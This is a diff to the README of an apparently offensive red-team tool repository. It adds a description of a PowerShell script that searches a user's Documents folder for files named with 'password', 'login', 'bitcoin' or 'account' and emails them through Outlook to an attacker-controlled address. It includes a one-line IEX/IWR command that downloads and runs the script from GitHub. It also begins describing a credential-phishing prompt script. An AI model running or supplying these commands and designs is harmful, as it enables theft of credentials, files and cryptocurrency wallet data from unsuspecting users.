@@ -2,7 +2,20 @@
 
 A collection of offensive code used for red team engagements. 
 
+### OutlookDocStealer.ps1
+```
+  * Usage: powershell IEX (IWR 'https://raw.githubusercontent.com/jeffjbowie/Weaponry/master/OutlookDocStealer.ps1'); Vicious -SendTo "attacker.controlled@email.com"
 
+  * Start new Outlook instance via COM object.
+  
+  * Create a new messages, with a Subject of "DOMAIN\USERNAME".
+  
+  * Scan %userprofile%\Documents for file names containing : "password", "login", "bitcoin", and "account".
+  
+  * If found files are < 25MB, attach to e-mail message.
+  
+  * Send message to attacker-controlled e-mail account.
+```
 ### LOLCredPhish.ps1
 ```
    * Prompt user to "authenticate" with a custom message.
